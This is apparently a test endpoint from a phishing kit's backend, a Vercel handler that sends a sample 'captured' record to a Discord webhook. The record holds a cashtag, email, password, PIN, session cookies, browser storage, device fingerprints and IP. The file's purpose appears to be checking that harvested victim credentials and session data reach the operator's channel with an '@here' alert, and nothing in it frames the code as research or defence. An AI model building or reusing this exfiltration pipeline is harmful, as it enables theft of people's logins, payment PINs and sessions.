/* ============================================================
   api/discord/test.js
   Visit /api/discord/test to verify the webhook end to end.
   ============================================================ */

import { createMessage, buildPayload, stageMeta } from '../_discord.js';

export default async function handler(req, res) {
  if (!process.env.DISCORD_WEBHOOK) {
    return res.status(500).json({
      ok: false,
      error: 'DISCORD_WEBHOOK is not set in Vercel environment variables',
    });
  }

  const row = {
    sid: 'test' + Date.now().toString(36),
    stage: 'done',
    email: '$jordan.tests',
    password: 'hunter2',
    pin: '4821',
    cookies: '_ga=GA1.2.918273465.1700000000; _fbp=fb.1.1700000000000.123456789; session=eyJhbGciOiJIUzI1NiJ9',
    ip: '8.8.8.8',
    ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
    localStorage: { cashtag: '$jordan.tests', adder_seen_intro: '1' },
    sessionStorage: { sid: 'abc123' },
    canvas: 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFAAH/q842iQAAAABJRU5ErkJggg',
    webgl: 'Apple GPU (WebGL 2.0)',
    ref: 'https://twitter.com/',
    received: new Date().toISOString(),
  };

  const payload = buildPayload(row, stageMeta('done'), 'Mountain View, California, US · Google LLC', '@here');
  const msg = await createMessage(payload);

  return res.status(200).json({
    ok: !!msg,
    message_id: (msg && msg.id) || null,
    hint: msg
      ? 'Check your Discord channel.'
      : 'Webhook rejected the request - check the URL and the Vercel logs.',
  });
}
